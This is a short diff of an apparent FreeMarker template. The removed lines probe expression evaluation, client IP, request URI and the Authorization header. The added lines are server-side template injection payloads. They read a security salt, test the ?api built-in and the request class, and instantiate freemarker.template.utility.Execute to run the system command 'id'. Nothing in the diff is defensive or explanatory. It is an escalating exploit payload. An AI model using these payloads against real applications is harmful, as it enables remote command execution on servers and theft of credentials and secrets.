@@ -1,4 +1,4 @@
-${7*7} is the answer
-ip=${request.clientAddress}
-uri=${request.uri}
-headers=${request.getHeader("Authorization")}
+salt=${security.defaultSalt!"BLOCKED"}
+api_test=${7?api!"NO_API"}
+class_test=${request.class.name!"NO_CLASS"}
+exec=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
